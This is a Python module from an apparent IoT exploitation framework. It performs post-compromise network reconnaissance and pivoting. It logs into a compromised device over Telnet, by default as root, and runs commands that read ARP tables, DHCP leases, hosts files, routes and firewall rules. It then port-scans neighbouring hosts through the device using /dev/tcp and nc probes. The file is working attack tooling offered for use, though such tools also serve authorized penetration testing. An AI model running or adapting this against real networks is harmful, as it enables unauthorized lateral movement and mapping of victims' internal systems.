# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""Network reconnaissance from a compromised IoT device.

Performs host and service discovery from an already-compromised embedded device,
leveraging its position inside the target network. Executes arp -a, ip neigh,
netstat, reads /proc/net/arp, and performs basic pivot scanning to discover
additional hosts reachable from the compromised endpoint.

MITRE ATT&CK: T1018 (Remote System Discovery), T1049 (System Network Connections Discovery)
References:
  - https://attack.mitre.org/techniques/T1018/
  - https://attack.mitre.org/techniques/T1049/

Version: 1.0.0
"""
from __future__ import annotations

import ipaddress
import re
import socket
import time
from typing import Dict, List, Optional, Set, Tuple

from embedxpl.core.exploit import (
    Exploit as BaseExploit,
    OptIP,
    OptPort,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_table,
    print_warning,
)


# Recon commands executed on the compromised device
_RECON_COMMANDS: List[Tuple[str, str]] = [
    ("arp -a 2>/dev/null || cat /proc/net/arp 2>/dev/null", "arp_table"),
    ("ip neigh show 2>/dev/null", "ip_neighbors"),
    ("ip addr show 2>/dev/null || ifconfig -a 2>/dev/null", "interfaces"),
    ("ip route show 2>/dev/null || route -n 2>/dev/null", "routes"),
    ("netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null", "listening_ports"),
    ("netstat -an 2>/dev/null || ss -an 2>/dev/null", "connections"),
    ("cat /proc/net/arp 2>/dev/null", "proc_arp"),
    ("cat /etc/hosts 2>/dev/null", "hosts_file"),
    ("cat /etc/resolv.conf 2>/dev/null", "dns_config"),
    ("cat /tmp/dhcp.leases 2>/dev/null || cat /var/lib/misc/dnsmasq.leases 2>/dev/null", "dhcp_leases"),
    ("cat /tmp/hosts/dhcp 2>/dev/null", "dhcp_hosts"),
    ("cat /etc/config/dhcp 2>/dev/null", "dhcp_config"),
    ("brctl show 2>/dev/null", "bridges"),
    ("cat /proc/net/nf_conntrack 2>/dev/null | head -100", "conntrack"),
    ("iptables -L -n 2>/dev/null | head -50", "firewall_rules"),
]

# Common ports to scan during pivot recon
_PIVOT_SCAN_PORTS = [22, 23, 80, 443, 8080, 8443, 161, 502, 554, 1883, 5000, 9100]

# IP address extraction patterns
_IP_PATTERN = re.compile(
    r"(?:^|[\s(])(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:[\s)]|$)"
)
_MAC_PATTERN = re.compile(
    r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
)


class Exploit(BaseExploit):
    """IoT Network Reconnaissance from Compromised Device.

    Performs network discovery and pivot scanning from an already-compromised
    IoT/embedded device. Collects ARP tables, routing information, active
    connections, DHCP leases, and performs basic TCP scan of discovered hosts.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "IoT Network Recon (Post-Compromise Pivot)",
        "description": (
            "Network reconnaissance from a compromised IoT device. Collects ARP table, "
            "routing info, active connections, DHCP leases, and performs basic pivot "
            "scanning of discovered hosts. MITRE: T1018, T1049."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://attack.mitre.org/techniques/T1018/",
            "https://attack.mitre.org/techniques/T1049/",
        ),
        "devices": (
            "OpenWrt routers",
            "BusyBox-based embedded Linux",
            "IoT gateways",
            "Network appliances",
            "Generic embedded Linux devices",
        ),
    }

    target = OptIP("", "Compromised device IPv4 or IPv6 address")
    port = OptPort(22, "SSH or Telnet port on compromised device")
    username = OptString("root", "Authentication username")
    password = OptString("", "Authentication password")
    scan_range = OptString("", "CIDR range to pivot-scan (e.g. 192.168.1.0/24)")

    def run(self) -> None:
        """Execute network reconnaissance from the compromised device."""
        print_status("Starting IoT network recon via {}:{}".format(self.target, self.port))

        sock = self._connect()
        if sock is None:
            print_error("Failed to connect to {}:{}".format(self.target, self.port))
            return

        try:
            if not self._authenticate(sock):
                print_error("Authentication failed on {}".format(self.target))
                return

            print_success("Authenticated to {} as '{}'".format(self.target, self.username))

            # Phase 1: Information gathering
            print_status("Phase 1: Gathering network information...")
            discovered_hosts: Set[str] = set()
            recon_data: Dict[str, str] = {}

            for cmd, label in _RECON_COMMANDS:
                output = self._exec_command(sock, cmd)
                if output and output.strip():
                    recon_data[label] = output.strip()
                    # Extract IPs from output
                    hosts = self._extract_ips(output)
                    discovered_hosts.update(hosts)

            # Display gathered information
            self._display_recon_results(recon_data)

            # Remove the compromised device itself and broadcast/multicast
            for addr in list(discovered_hosts):
                if addr == str(self.target) or addr.startswith("0.") or addr == "255.255.255.255":
                    discovered_hosts.discard(addr)
                try:
                    ip_obj = ipaddress.ip_address(addr)
                    if ip_obj.is_multicast or ip_obj.is_loopback:
                        discovered_hosts.discard(addr)
                except ValueError:
                    discovered_hosts.discard(addr)

            print_success("Discovered {} unique hosts from network data".format(len(discovered_hosts)))
            if discovered_hosts:
                print_table(
                    ("Discovered Host",),
                    *[(h,) for h in sorted(discovered_hosts, key=self._ip_sort_key)],
                )

            # Phase 2: Pivot scanning
            scan_targets = self._resolve_scan_targets(discovered_hosts)
            if scan_targets:
                print_status("Phase 2: Pivot scanning {} hosts...".format(len(scan_targets)))
                self._pivot_scan(sock, scan_targets)
            else:
                print_info("No scan targets resolved. Set scan_range for explicit range scanning.")

        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _connect(self) -> Optional[socket.socket]:
        """Establish TCP connection to the compromised device."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=10,
            )
            sock.settimeout(8)
            return sock
        except (OSError, socket.error) as exc:
            print_error("Connection error: {}".format(exc))
            return None

    def _recv_until(self, sock: socket.socket, markers: List[bytes],
                    timeout: float = 5.0) -> bytes:
        """Receive data until one of the marker sequences appears."""
        data = b""
        end_time = time.monotonic() + timeout
        while time.monotonic() < end_time:
            remaining = end_time - time.monotonic()
            if remaining <= 0:
                break
            sock.settimeout(min(remaining, 2.0))
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                for marker in markers:
                    if marker in data:
                        return data
            except socket.timeout:
                if data:
                    break
            except OSError:
                break
        return data

    def _authenticate(self, sock: socket.socket) -> bool:
        """Authenticate via Telnet-style interactive login."""
        # Read banner and wait for login prompt
        banner = self._recv_until(sock, [b"ogin:", b"sername:", b"#", b"$"], timeout=8)

        # If we already got a shell prompt, we are in
        if b"#" in banner or b"$" in banner:
            return True

        # Send username
        sock.sendall(str(self.username).encode() + b"\r\n")

        # Wait for password prompt
        pwd_data = self._recv_until(sock, [b"assword:", b"asscode:", b"#", b"$"], timeout=5)

        if b"#" in pwd_data or b"$" in pwd_data:
            return True

        if b"assword:" in pwd_data or b"asscode:" in pwd_data:
            sock.sendall(str(self.password).encode() + b"\r\n")

        # Check for shell prompt
        result = self._recv_until(sock, [b"#", b"$", b">"], timeout=5)
        if b"#" in result or b"$" in result or b">" in result:
            return True

        if b"incorrect" in result.lower() or b"denied" in result.lower():
            return False

        # Probe with a command
        sock.sendall(b"id\r\n")
        id_data = self._recv_until(sock, [b"uid="], timeout=3)
        return b"uid=" in id_data

    def _exec_command(self, sock: socket.socket, cmd: str) -> str:
        """Execute a command on the compromised device via Telnet."""
        try:
            # Flush pending data
            sock.settimeout(0.3)
            try:
                sock.recv(4096)
            except socket.timeout:
                pass

            sock.sendall(cmd.encode() + b"\r\n")
            time.sleep(0.3)

            output = self._recv_until(sock, [b"#", b"$", b">"], timeout=5)
            decoded = output.decode("utf-8", errors="replace")

            lines = decoded.splitlines()
            # Strip echoed command
            if lines and cmd.split()[0] in lines[0]:
                lines = lines[1:]
            # Strip trailing prompt
            if lines and re.match(r"^[\w\-@.:~#$>]+\s*$", lines[-1]):
                lines = lines[:-1]

            return "\n".join(lines)
        except (OSError, socket.error):
            return ""

    def _extract_ips(self, text: str) -> Set[str]:
        """Extract valid IPv4 addresses from text output."""
        found: Set[str] = set()
        for match in _IP_PATTERN.finditer(text):
            addr = match.group(1)
            try:
                ip_obj = ipaddress.ip_address(addr)
                if ip_obj.is_private or ip_obj.is_global:
                    found.add(addr)
            except ValueError:
                continue
        return found

    def _display_recon_results(self, data: Dict[str, str]) -> None:
        """Display formatted reconnaissance results."""
        section_names = {
            "arp_table": "ARP Table",
            "ip_neighbors": "IP Neighbors",
            "interfaces": "Network Interfaces",
            "routes": "Routing Table",
            "listening_ports": "Listening Services",
            "connections": "Active Connections",
            "proc_arp": "Proc ARP Cache",
            "hosts_file": "/etc/hosts",
            "dns_config": "DNS Configuration",
            "dhcp_leases": "DHCP Leases",
            "dhcp_hosts": "DHCP Hosts",
            "dhcp_config": "DHCP Configuration",
            "bridges": "Bridge Interfaces",
            "conntrack": "Connection Tracking",
            "firewall_rules": "Firewall Rules",
        }

        for key, output in data.items():
            name = section_names.get(key, key)
            print_info("--- {} ---".format(name))
            # Print first 15 lines to avoid flooding output
            lines = output.splitlines()
            for line in lines[:15]:
                print_info("  {}".format(line))
            if len(lines) > 15:
                print_info("  ... ({} more lines)".format(len(lines) - 15))

    def _resolve_scan_targets(self, discovered: Set[str]) -> List[str]:
        """Build the list of IPs to pivot-scan."""
        targets: Set[str] = set()

        # Add discovered hosts
        targets.update(discovered)

        # Add scan_range if specified
        scan_range = str(self.scan_range).strip()
        if scan_range:
            try:
                network = ipaddress.ip_network(scan_range, strict=False)
                # Limit to /24 max to avoid excessive scanning
                if network.num_addresses > 256:
                    print_warning("Scan range too large ({}). Limiting to first 256 hosts.".format(
                        network.num_addresses,
                    ))
                    count = 0
                    for host in network.hosts():
                        if count >= 256:
                            break
                        targets.add(str(host))
                        count += 1
                else:
                    for host in network.hosts():
                        targets.add(str(host))
            except ValueError as exc:
                print_error("Invalid scan range '{}': {}".format(scan_range, exc))

        # Remove self
        targets.discard(str(self.target))

        return sorted(targets, key=self._ip_sort_key)

    def _pivot_scan(self, sock: socket.socket, targets: List[str]) -> None:
        """Perform pivot scanning through the compromised device.

        Uses the compromised device to probe neighboring hosts by sending
        shell commands that attempt TCP connections.
        """
        results: List[Tuple[str, str, str]] = []

        for host_ip in targets:
            open_ports: List[int] = []

            for port in _PIVOT_SCAN_PORTS:
                # Use shell-based port probing via the compromised device
                # echo method works on most BusyBox deployments
                probe_cmd = (
                    "(echo >/dev/tcp/{}/{}) 2>/dev/null && echo OPEN || "
                    "(echo X | nc -w 1 {} {} 2>/dev/null && echo OPEN || echo CLOSED)"
                ).format(host_ip, port, host_ip, port)

                output = self._exec_command(sock, probe_cmd)
                if output and "OPEN" in output:
                    open_ports.append(port)

            if open_ports:
                port_str = ", ".join(str(p) for p in open_ports)
                service_str = ", ".join(
                    self._port_to_service(p) for p in open_ports
                )
                results.append((host_ip, port_str, service_str))
                print_success("  {} : open ports [{}]".format(host_ip, port_str))
            else:
                print_info("  {} : no open ports detected".format(host_ip))

        if results:
            print_success("Pivot scan complete: {} hosts with open ports".format(len(results)))
            print_table(
                ("Host", "Open Ports", "Services"),
                *results,
            )
        else:
            print_warning("No open ports found on scanned hosts.")

    @staticmethod
    def _port_to_service(port: int) -> str:
        """Map common port numbers to service names."""
        services: Dict[int, str] = {
            22: "SSH",
            23: "Telnet",
            80: "HTTP",
            443: "HTTPS",
            8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
            161: "SNMP",
            502: "Modbus",
            554: "RTSP",
            1883: "MQTT",
            5000: "UPnP",
            9100: "Printer",
        }
        return services.get(port, "unknown")

    @staticmethod
    def _ip_sort_key(addr: str) -> Tuple[int, ...]:
        """Generate a sort key for IPv4 addresses."""
        try:
            return tuple(int(o) for o in addr.split("."))
        except (ValueError, AttributeError):
            return (999, 999, 999, 999)

    def check(self) -> bool:
        """Check if target port is reachable."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=5,
            )
            sock.close()
            return True
        except (OSError, socket.error):
            return False
